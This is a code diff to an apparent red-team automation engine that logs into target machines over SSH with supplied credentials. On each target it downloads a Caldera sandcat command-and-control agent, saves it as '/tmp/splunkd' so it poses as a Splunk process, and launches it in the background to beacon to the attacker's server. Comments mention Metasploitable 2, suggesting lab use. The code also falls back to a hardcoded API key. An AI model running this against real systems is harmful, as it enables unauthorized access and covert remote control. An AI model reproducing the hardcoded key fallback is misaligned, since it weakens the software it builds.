@@ -102,6 +102,8 @@ class InitialAccessEngine:
         try:
             import asyncssh  # deferred import — not available in all envs
 
+            from app.config import settings as _settings
+
             username, password = credential
             async with await asyncssh.connect(
                 ip,
@@ -109,21 +111,80 @@ class InitialAccessEngine:
                 password=password,
                 known_hosts=None,
             ) as conn:
+                # Detect target architecture to pick the right sandcat binary.
+                # Metasploitable 2 is i686 (32-bit); modern systems are x86_64.
+                arch_result = await conn.run("uname -m", check=False)
+                arch = (arch_result.stdout or "").strip()
+                if arch in ("i686", "i386"):
+                    sandcat_file = "sandcat.go-linux-386"
+                else:
+                    sandcat_file = "sandcat.go-linux"
+
+                api_key = _settings.CALDERA_API_KEY or "ADMIN123456"
+
                 # Download sandcat binary
-                await conn.run(
+                download_result = await conn.run(
                     f"curl -s -X POST {caldera_host}/file/download"
-                    f' -H "platform: linux"'
-                    f' -H "file: sandcat.go-linux"'
-                    f' -H "Authorization: ADMIN123456"'
+                    f" -H 'platform: linux'"
+                    f" -H 'file: {sandcat_file}'"
+                    f" -H 'Authorization: {api_key}'"
                     f" -o /tmp/splunkd",
-                    check=True,
+                    check=False,
                 )
+                if download_result.exit_status != 0:
+                    logger.error(
+                        "sandcat download failed (arch=%s, file=%s): %s",
+                        arch, sandcat_file, download_result.stderr,
+                    )
+                    return False
+
+                # Verify it's a valid ELF binary (not an error page).
+                # Caldera only ships sandcat.go-linux (64-bit); the 32-bit variant
+                # (sandcat.go-linux-386) must be manually compiled from the gocat source
+                # with Go ≤ 1.17 (Go 1.18+ requires Linux kernel ≥ 2.6.32, but
+                # Metasploitable 2 runs 2.6.24 which causes epollcreate1 ENOSYS crash).
+                check_result = await conn.run(
+                    "head -c 4 /tmp/splunkd | od -An -tx1 | tr -d ' \\n'",
+                    check=False,
+                )
+                magic = (check_result.stdout or "").strip()
+                if not magic.startswith("7f454c46"):
+                    logger.warning(
+                        "sandcat download returned non-ELF content "
+                        "(magic=%s, file=%s); skipping agent deployment for %s",
+                        magic, sandcat_file, ip,
+                    )
+                    # Return False: SSH access was achieved but agent could not be deployed.
+                    return False
+
+                # Detect kernel version to warn about known incompatibility.
+                kernel_result = await conn.run("uname -r", check=False)
+                kernel_str = (kernel_result.stdout or "").strip()
+                try:
+                    major, minor = (int(x) for x in kernel_str.split(".")[:2])
+                    if arch in ("i686", "i386") and (major, minor) < (2, 32):
+                        # Sandcat compiled with Go 1.18+ crashes on kernels < 2.6.32
+                        # due to missing epoll_create1 syscall.  Requires custom build
+                        # with Go ≤ 1.17.  See docs/known-limitations.md#sandcat-legacy
+                        logger.warning(
+                            "Kernel %s is below 2.6.32 — sandcat Go binary may crash "
+                            "on %s due to epoll_create1 ENOSYS (requires Go ≤ 1.17 build)",
+                            kernel_str, ip,
+                        )
+                except ValueError:
+                    pass  # Couldn't parse kernel version — proceed anyway
+
                 # Make executable
                 await conn.run("chmod +x /tmp/splunkd", check=True)
                 # Launch agent in background
                 await conn.run(
-                    f"nohup /tmp/splunkd -server {caldera_host} -group red &",
+                    f"nohup /tmp/splunkd -server {caldera_host} -group red"
+                    f" > /tmp/splunkd.log 2>&1 &",
                     check=True,
+                )
+                logger.info(
+                    "Caldera sandcat launched on %s (arch=%s, kernel=%s, file=%s, callback=%s)",
+                    ip, arch, kernel_str, sandcat_file, caldera_host,
                 )
 
             # Wait for agent to beacon home
